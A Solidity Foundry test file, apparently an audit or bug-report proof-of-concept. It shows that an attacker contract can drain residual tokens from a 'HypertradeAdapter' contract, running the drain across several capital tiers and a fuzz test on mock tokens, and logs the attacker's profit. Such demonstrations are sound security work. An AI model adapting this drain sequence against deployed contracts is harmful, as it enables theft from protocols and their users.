// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {HypertradeAdapter} from "../contracts/periphery/HypertradeAdapter.sol";
import {MockERC20, MockNoOpRouter, AdapterAttacker} from "./Mocks.sol";

/// @notice Deterministic local-model capital/residual matrix. The model token
/// is defined as 1:1 USD only inside this harness; these are not mainnet USD
/// measurements. Tier D is intentionally absent because on-chain TVL is unknown.
contract CampaignTest is Test {
    address internal attacker = address(0xA77ACC);
    address internal residualSource = address(0xB1C71);

    function test_ModelCapitalMatrix_3Tiers_8Seeds() public {
        MockERC20 tokenIn = new MockERC20("debt", "D", 18);
        MockERC20 tokenOut = new MockERC20("model USD residual", "mUSD", 18);
        MockNoOpRouter router = new MockNoOpRouter();
        HypertradeAdapter adapter = new HypertradeAdapter(address(router));
        AdapterAttacker sweep = new AdapterAttacker();
        uint256 state0 = vm.snapshot();

        uint256[3] memory tiers = [uint256(1e6 ether), uint256(1e7 ether), uint256(1e8 ether)];
        for (uint256 tierIndex; tierIndex < tiers.length; ++tierIndex) {
            for (uint256 seed; seed < 8; ++seed) {
                vm.revertTo(state0);
                uint256 residual = tiers[tierIndex] - seed; // distinct nonzero amounts
                tokenOut.mint(residualSource, residual);
                vm.prank(residualSource);
                tokenOut.transfer(address(adapter), residual);

                uint256 attackerBefore = tokenOut.balanceOf(attacker);
                uint256 protocolBefore = tokenOut.balanceOf(address(adapter));
                vm.prank(attacker);
                sweep.sweepHypertrade(adapter, address(tokenIn), address(tokenOut), attacker);
                int256 deltaAttacker = int256(tokenOut.balanceOf(attacker)) - int256(attackerBefore);
                int256 deltaProtocol = int256(tokenOut.balanceOf(address(adapter))) - int256(protocolBefore);
                int256 pnl = deltaAttacker; // all other costs denominated zero in model; native gas logged separately

                assertEq(deltaAttacker, int256(residual));
                assertEq(deltaProtocol, -int256(residual));
                assertEq(deltaAttacker + deltaProtocol, 0);
                assertGt(pnl, 0);
                console2.log("campaign seed", seed);
                console2.log("  capitalTier(A=0,B=1,C=2)", tierIndex);
                console2.log("  stateId=3 direct_residual; sequence=setPath,swap0,redeemBalance");
                console2.log("  delta_attacker_mUSD_units", deltaAttacker);
                console2.log("  delta_protocol_mUSD_units", deltaProtocol);
                console2.log("  delta_residual_source_mUSD_units", -int256(residual));
                console2.log("  PnL_attacker_mUSD_units_before_native_gas", pnl);
            }
        }
    }

    function testFuzz_ModelResidualDrain(uint256 residual, uint8 salt) public {
        residual = bound(residual, 1, 1e8 ether);
        MockERC20 tokenIn = new MockERC20("debt", "D", 18);
        MockERC20 tokenOut = new MockERC20("model USD residual", "mUSD", 18);
        MockNoOpRouter router = new MockNoOpRouter();
        HypertradeAdapter adapter = new HypertradeAdapter(address(router));
        AdapterAttacker sweep = new AdapterAttacker();

        tokenOut.mint(residualSource, residual);
        vm.prank(residualSource);
        tokenOut.transfer(address(adapter), residual);
        vm.prank(attacker);
        sweep.sweepHypertrade(adapter, address(tokenIn), address(tokenOut), attacker);

        assertEq(tokenOut.balanceOf(attacker), residual);
        assertEq(tokenOut.balanceOf(address(adapter)), 0);
        assertGt(residual, 0);
        salt; // fuzz input documents that route-independent salt cannot change the result
    }
}
